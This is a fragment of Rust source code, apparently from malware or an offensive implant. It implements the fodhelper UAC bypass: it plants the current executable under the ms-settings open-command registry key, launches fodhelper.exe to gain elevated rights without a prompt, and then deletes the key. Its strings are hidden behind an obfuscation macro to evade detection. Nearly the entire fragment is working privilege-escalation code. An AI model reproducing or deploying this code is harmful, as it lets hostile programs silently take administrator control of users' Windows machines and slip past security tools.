...
fn fodhelper_bypass() -> Result<(), Box<dyn std::error::Error>> {
    ...
    let base_path = crate::obf!("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    let (key, _) = hkcu.create_subkey(&base_path)?;

    // "DelegateExecute"
    let delegate_execute = crate::obf!("DelegateExecute");
    key.set_value("", &current_exe)?;
    key.set_value(delegate_execute, &"")?;

    // "fodhelper.exe"
    let fodhelper = crate::obf!("fodhelper.exe");

    let _ = Command::new(fodhelper).spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(crate::obf!("Software\\Classes\\ms-settings"));
